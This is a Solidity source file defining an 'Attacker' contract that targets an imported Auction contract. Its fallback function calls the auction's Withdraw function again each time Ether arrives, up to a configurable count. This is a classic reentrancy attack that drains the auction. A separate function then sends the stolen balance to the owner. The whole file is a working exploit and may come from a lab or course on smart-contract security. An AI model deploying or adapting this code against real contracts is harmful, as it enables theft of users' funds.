pragma solidity ^0.5.0;
import "contracts/Auction.sol";

contract Attacker {
    Auction public auction;

    uint public cant = 0;
    uint public max = 0;
    address payable public owner;

    event FallbackFunc(address indexed from, address indexed to, uint256 value, uint cant);


    constructor(address payable _owner, address _auction, uint _max) public {
        owner = _owner;
        auction = Auction(_auction);
        max = _max;
    }

    function setMax(uint _max) public {
        max = _max;
    }

    function Bid() public payable {
        require(msg.sender == owner);
        auction.Bid.value(msg.value)();
    }

    function Withdraw() public payable {
        require(msg.sender == owner);
        auction.Withdraw();
    }

    function sendme() public payable {
        require(msg.sender == owner);
        (bool sent, ) = owner.call.value(address(this).balance)("");
        require(sent);
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }


     // Fallback is called when Auction sends Ether to this contract.
    function() external payable {
        emit FallbackFunc(msg.sender, address(this), msg.value, cant);
        if (cant < max) {
            cant++;
            auction.Withdraw();
        }
    }

}